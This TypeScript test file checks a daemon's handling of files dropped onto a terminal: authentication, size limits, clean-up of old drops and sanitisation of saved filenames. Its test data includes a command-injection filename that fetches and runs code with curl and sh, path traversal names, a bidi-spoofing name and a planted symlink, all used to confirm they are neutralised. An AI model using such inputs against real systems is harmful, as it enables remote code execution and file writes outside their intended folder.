import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, statSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { Readable } from "node:stream";
import { ApiEnvelope, DROP_NAME_HEADER, DROP_PATH, DroppedFile, dropTooLarge, MAX_DROP_BYTES } from "@trackwall/protocol";
import { loopbackRequest } from "../src/infra/loopback.ts";
import { DroppedFiles, savedName } from "../src/modules/terminals/dropped-files.ts";
import { startSessionApi } from "./support/session-api.ts";
import { SLOW_TEST_TIMEOUT_MS } from "./support/test-timeouts.ts";

const TOKEN = "d".repeat(43);
const DAY_AND_HOUR_MS = 25 * 60 * 60 * 1000;
let daemon: Awaited<ReturnType<typeof startSessionApi>>;

beforeAll(async () => {
  daemon = await startSessionApi(TOKEN);
}, SLOW_TEST_TIMEOUT_MS);

afterAll(() => daemon.stop());

function drop(name: string | undefined, body: string, opts: { token?: string; headers?: Record<string, string> } = {}) {
  return loopbackRequest(daemon.api.port, DROP_PATH, {
    method: "POST",
    token: opts.token ?? TOKEN,
    headers: {
      "content-type": "application/octet-stream",
      ...(name === undefined ? {} : { [DROP_NAME_HEADER]: encodeURIComponent(name) }),
      ...opts.headers,
    },
    body,
    timeoutMs: 10_000,
  });
}

function envelopeOf(res: { body: string }) {
  return ApiEnvelope.parse(JSON.parse(res.body));
}

/** The path of the saved copy; a refusal fails the test with the daemon's message. */
function savedPath(res: { body: string }): string {
  const envelope = envelopeOf(res);
  if (!envelope.ok) throw new Error(envelope.error.message);
  return DroppedFile.parse(envelope.data).path;
}

describe("a file dropped on a terminal from another computer", () => {
  test("is saved under .trackwall/drops of the projects folder, in a folder of its own, and its path comes back", async () => {
    const path = savedPath(await drop("build log.txt", "BUILD FAILED\n"));
    expect(dirname(dirname(path))).toBe(join(daemon.projects, ".trackwall", "drops"));
    expect(path.endsWith("build log.txt")).toBe(true);
    expect(readFileSync(path, "utf8")).toBe("BUILD FAILED\n");
    if (process.platform !== "win32") expect(statSync(path).mode & 0o777).toBe(0o600);
  });

  test("of the same name twice gives two files, the first one untouched", async () => {
    const first = savedPath(await drop("notes.md", "one"));
    const second = savedPath(await drop("notes.md", "two"));
    expect(second).not.toBe(first);
    expect(readFileSync(first, "utf8")).toBe("one");
    expect(readFileSync(second, "utf8")).toBe("two");
  });

  test("with a name that is a path stays in its own folder of drops, under a name made safe", async () => {
    const drops = join(daemon.projects, ".trackwall", "drops");
    for (const name of ["../escape.txt", "..", "a/b.txt", "a\\b.txt", "evil\u0000.txt"])
      expect(dirname(dirname(savedPath(await drop(name, "x"))))).toBe(drops);
    expect(existsSync(join(daemon.projects, ".trackwall", "escape.txt"))).toBe(false);
  });

  test("without a name is refused", async () => {
    const envelope = envelopeOf(await drop(undefined, "x"));
    expect(envelope.ok ? "saved" : envelope.error.code).toBe("bad_request");
  });

  test("that says it is larger than the limit is refused with the reason", async () => {
    const res = await drop("dump.hprof", "x", { headers: { "content-length": String(MAX_DROP_BYTES + 1) } });
    expect(res.status).toBe(400);
    const envelope = envelopeOf(res);
    expect(envelope.ok ? "saved" : envelope.error.message).toBe(dropTooLarge("dump.hprof"));
  });

  test("can come from the desktop app's window, which asks first whether it may send the name header", async () => {
    const pre = await loopbackRequest(daemon.api.port, DROP_PATH, {
      method: "OPTIONS",
      headers: { origin: "http://tauri.localhost", "access-control-request-headers": `authorization, content-type, ${DROP_NAME_HEADER}` },
      timeoutMs: 10_000,
    });
    expect(pre.status).toBe(204);
    expect(pre.headers["access-control-allow-headers"]).toContain(DROP_NAME_HEADER);
  });

  test("needs the daemon token", async () => {
    const res = await drop("secret.txt", "x", { token: "w".repeat(43) });
    expect(res.status).toBe(401);
  });
});

describe("the store of dropped files", () => {
  test("cuts a body over the limit and leaves no part of it behind", async () => {
    const projects = mkdtempSync(join(tmpdir(), "trackwall-drops-"));
    const files = new DroppedFiles({ projectsDir: async () => projects, now: () => new Date(), maxBytes: 4 });
    await expect(files.save("big.bin", Readable.from([Buffer.from("12345")]))).rejects.toThrow(dropTooLarge("the file"));
    expect(readdirSync(join(projects, ".trackwall", "drops"))).toEqual([]);
  });

  test("removes drops older than a day at the next drop and leaves other entries alone", async () => {
    const projects = mkdtempSync(join(tmpdir(), "trackwall-drops-"));
    const drops = join(projects, ".trackwall", "drops");
    const now = new Date("2026-11-04T12:00:00Z");
    const files = new DroppedFiles({ projectsDir: async () => projects, now: () => now, maxBytes: 100 });
    const old = await files.save("old.txt", Readable.from([Buffer.from("old")]));
    const longAgo = new Date(now.getTime() - DAY_AND_HOUR_MS);
    utimesSync(dirname(old), longAgo, longAgo);
    mkdirSync(join(drops, "kept-by-the-user"));
    utimesSync(join(drops, "kept-by-the-user"), longAgo, longAgo);
    writeFileSync(join(drops, "README.txt"), "");
    const fresh = await files.save("fresh.txt", Readable.from([Buffer.from("fresh")]));
    expect(existsSync(old)).toBe(false);
    expect(existsSync(fresh)).toBe(true);
    expect(readdirSync(drops).sort()).toEqual([dirname(fresh).slice(drops.length + 1), "README.txt", "kept-by-the-user"].sort());
  });

  test("removes an old drop's own file but never follows a folder in it into a link", async () => {
    const projects = mkdtempSync(join(tmpdir(), "trackwall-drops-"));
    const outside = mkdtempSync(join(tmpdir(), "trackwall-outside-"));
    writeFileSync(join(outside, "precious.txt"), "keep");
    const now = new Date("2026-11-04T12:00:00Z");
    const files = new DroppedFiles({ projectsDir: async () => projects, now: () => now, maxBytes: 100 });
    const old = await files.save("old.txt", Readable.from([Buffer.from("old")]));
    mkdirSync(join(dirname(old), "planted"));
    symlinkSync(outside, join(dirname(old), "planted", "link"), "junction");
    const longAgo = new Date(now.getTime() - DAY_AND_HOUR_MS);
    utimesSync(dirname(old), longAgo, longAgo);
    await files.save("new.txt", Readable.from([Buffer.from("new")]));
    expect(existsSync(old)).toBe(false);
    expect(readFileSync(join(outside, "precious.txt"), "utf8")).toBe("keep");
  });
});

describe("the name a dropped file is saved under", () => {
  test("keeps letters of any language, digits, spaces and the extension", () => {
    expect(savedName("Zażółć gęślą jaźń 2026-11-04.png")).toBe("Zażółć gęślą jaźń 2026-11-04.png");
    expect(savedName(".env.local")).toBe(".env.local");
  });

  test("turns anything a shell or a file system would read differently into _", () => {
    expect(savedName("report$(curl evil.sh;sh).pdf")).toBe("report__curl evil.sh_sh_.pdf");
    expect(savedName('a/b\\c:d*e?f"g<h>i|j`k.txt')).toBe("a_b_c_d_e_f_g_h_i_j_k.txt");
    expect(savedName("bidi‮txt.exe")).toBe("bidi_txt.exe");
    expect(savedName("line\nbreak")).toBe("line_break");
  });

  test("is never empty, a dot name, a Windows device or ending in a dot or space", () => {
    expect(savedName("..")).toBe("dropped-file");
    expect(savedName("")).toBe("dropped-file");
    expect(savedName("NUL.txt")).toBe("_NUL.txt");
    expect(savedName("com1")).toBe("_com1");
    expect(savedName("trailing. ")).toBe("trailing");
  });

  test("is cut to 200 bytes with its extension kept", () => {
    const name = savedName(`${"ż".repeat(300)}.log`);
    expect(Buffer.byteLength(name)).toBeLessThanOrEqual(200);
    expect(name.endsWith("ż.log")).toBe(true);
  });
});
